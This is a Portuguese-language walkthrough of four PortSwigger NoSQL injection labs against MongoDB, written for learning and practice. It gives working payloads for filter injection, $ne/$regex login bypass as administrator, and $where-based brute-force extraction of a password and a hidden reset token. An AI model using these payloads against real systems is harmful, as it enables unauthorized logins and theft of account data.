---
title: "PortSwigger - NoSQL Injection"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de NoSQL Injection da PortSwigger"
keywords: ["PortSwigger", "NoSQL Injection", "MongoDB", "Web Security", "Injection"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Detecting NoSQL injection
"The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products. "

Intercepte o filtro de categorias.
Observamos que as queries são feitas apenas pela URL:
```
GET /filter?category=Pets
```
Para detectar uma possível vulnerabilidade NoSQL injection notamos as diferenças entre as respostas do payload `'` para `\'`. 
No primeiro caso a resposta é uma mensagem de erro:
`Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 &apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}`

No segundo caso, apenas é tratado como um filtro e não mostrará nenhum produto.
Portanto, o seguinte payload dará conta de revelar os produtos não lançados:
```
GET /filter?category=Lifestyle'||'1'=='1
```

## Lab: Exploiting NoSQL operator injection to bypass authentication
"The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the `administrator` user.

You can log in to your own account using the following credentials: `wiener:peter`."

Intercepte a requisição e componha um payload de teste com o usuário que já temos:
```
{"username":{"$ne":"invalid"},"password":"peter"}
```
A resposta recebida: `302 Found` indica existe a vulnerabilidade de injection de operadores NoSQL.
Após isso, o payload para conseguir a conta de administrador:
```
{"username":{"$regex": "admin.*"},"password":{"$ne":""}}
```
Por fim, é necessário apenas logar na conta de admin com o cookie recebido:
```
GET /my-account?id=adminv8b2vfd7 HTTP/2
[...]
Cookie: session=WZjAZVy6dfpyV2e2TcgDYQZQXmS6pSBF
[...]
```

## Lab: Exploiting NoSQL injection to extract data
"The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the administrator user, then log in to their account.

You can log in to your own account using the following credentials: wiener:peter. "

A funcionalidade de "user lookup" aparece após logar na conta que temos acesso.
Interceptamos pelo Burp a requisição de caminho /user/lookup:
```
GET /user/lookup?user=wiener
```
Obtendo como resposta um json com informações sobre o usuário requisitado: 
```
{
  "username": "wiener",
  "email": "a@email.com",
  "role": "user"
}
```
A partir dessa resposta, inferimos que os campos de usuário na coleção são: 
- username;
- email;
- role;
- password.
A existência do campo password pode ser confirmada pelo seguinte payload:
```
wiener' && this.password == 'peter
```
Após isso, para descobrir a senha do administrador foi um pouco de força bruta:
1. Descobrir quais caracteres foram usados por regex: `this.password.match(/\d/)`, `this.password.match(/[a-z]/)`, `this.password.match(/[A-Z]/)`.  Desses o único que obteve resposta do servidor foi "\[a-z]"
2. Descobrir o tamanho da senha: `this.password.length == $$`. Esse parâmetro pode ser obtido pelo Burp Suite intruder. Obtemos 8.
3. Reduzir o escopo da senha: verificando quais caracteres são usados na senha. Descobrimos os caracteres "wdlrtqms".
4. Fazer o login como usuário administrator usando uma das combinações desses caracteres. Esse passo pode ser realizado com com python simples, ou tentando caractere por caractere com Burp Suite intruder:  `this.password[§0§] == §a§`
Esses foram os passos que tomei, mas eles poderiam ter sido abreviados pela utilização do payload `this.password[§0§] == §a§` assim que o range de caracteres e o tamanho da senha foram descobertos, utilizando o Burp Suite Intruder.

## Lab: Exploiting NoSQL operator injection to extract unknown fields
" The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as carlos. "
Quando injetamos o seguinte operador NoSQL no campo de senha da tela de login, recebemos uma resposta diferente.
```
{"username":"carlos","password":{"$ne":""}}
```
Resposta: 
```
Account locked: please reset your password
```
Já que agora temos duas respostas distintas em uma mesma funcionalidade, podemos tentar exfiltrar dados sobre outros campos com o payload:
```
{"username":"carlos","password":{
"$ne":""
},
"$where":"Object.keys(this)[0].match('^_')"
}
```
Caso a resposta tenha sido "Account locked ..." saberemos que houve match da string. Caso contrário, saberemos que não houve match.
Usando Burp Intruder iterando sobre o campo: 
"$where":"Object.keys(this)\[\$\$\].match('')" 
Descobrimos que o objeto possui 5 campos, pois a partir do índice 5 a resposta é 500.
Confirmamos o tamanho de cada elemento com o payload:
```
{"username":"carlos","password":{
"$ne":""
},
"$where":"Object.keys(this)[4].length == x"
}
```

Com isso, descobrimos por força bruta utilizando o Intruder: 
0 -> \_id
1 -> username
2 -> password 
3 -> email 
4 -> forgotPwd

Se inserirmos na url de Requisição da página de "forgot-password" com o 4 campo, obtemos uma resposta diferente do usual que indica uma vulnerabilidade.
url de teste: `/forgot-password?forgotPwd=10`
Resposta:
```
HTTP/2 400 Bad Request
[...]

"Invalid token"
```

Portanto, devemos descobrir o valor do campo `forgotPwd`. A fim de atingir tal objetivo, modificamos o payload anterior: 
```
{"username":"carlos","password":{
"$ne":""
},
"$where":"this.forgotPwd.match('^.{}$$.*')"
}
```
Assim, usando a mesma estratégia de força bruta, descobrimos o token do usuário `66479d23f4ca8be9` e somos redirecionado para a página de troca de senha. 
Após inserir uma nova senha para o usuário e logar na conta, resolvemos o desafio.
